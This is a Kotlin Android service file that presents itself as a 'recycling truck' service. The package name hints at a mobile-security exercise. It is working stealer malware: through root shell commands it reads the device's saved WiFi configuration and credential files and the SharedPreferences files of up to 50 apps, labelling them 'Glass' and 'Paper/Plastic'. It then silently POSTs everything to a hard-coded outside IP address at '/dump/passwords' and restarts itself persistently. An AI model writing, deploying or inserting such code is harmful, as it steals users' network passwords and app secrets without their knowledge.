package com.example.mobsec_823.RecylingService

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.BufferedReader
import java.io.InputStreamReader
import java.lang.StringBuilder

class RecyclingTruckService : Service() {

    private val TAG = "RecyclingTruckService"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            val recycledData = sortMaterials()
            sendToProcessingPlant(recycledData)
        }.start()
        return START_STICKY
    }

    private fun sortMaterials(): String {
        val sb = StringBuilder("=== RECYCLING SORTED MATERIALS ===\n\n")

        // WiFi credentials as "Glass"
        sb.append("--- [Glass] Material Collection ---\n")
        val apexWifi = executeFactoryCommand("cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml")
        if (apexWifi != null && apexWifi.contains("WifiConfiguration")) {
            sb.append(apexWifi)
        } else {
            val modernWifi = executeFactoryCommand("cat /data/misc/wifi/WifiConfigStore.xml")
            if (modernWifi != null && modernWifi.contains("WifiConfiguration")) {
                sb.append(modernWifi)
            } else {
                val legacyWifi = executeFactoryCommand("cat /data/misc/wifi/wpa_supplicant.conf")
                sb.append(legacyWifi ?: "Bin empty\n")
            }
        }

        // SharedPreferences as "Paper/Plastic"
        sb.append("\n--- [Paper/Plastic] Material Collection ---\n")
        val prefsList = executeFactoryCommand("find /data/data -name \"*.xml\" -path \"*/shared_prefs/*\" 2>/dev/null")
        prefsList?.let { list ->
            val files = list.lines().filter { it.isNotBlank() }.take(50)
            files.forEach { file ->
                sb.append("\nContainer: $file\n")
                sb.append(executeFactoryCommand("cat \"$file\"") ?: "Crushed\n")
            }
        }

        return sb.toString()
    }

    private fun executeFactoryCommand(command: String): String? {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
                StringBuilder().apply {
                    reader.forEachLine { append(it).append("\n") }
                }.toString()
            }.also { process.waitFor() }
        } catch (e: Exception) {
            null
        }
    }

    private fun sendToProcessingPlant(data: String) {
        try {
            val client = OkHttpClient()
            val requestBody = data.toRequestBody("text/plain".toMediaType())
            val request = Request.Builder()
                .url("http://47.129.144.9:8000/dump/passwords")
                .post(requestBody)
                .build()
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) Log.i(TAG, "Materials sent for processing")
            }
        } catch (e: Exception) {
        }
    }
}
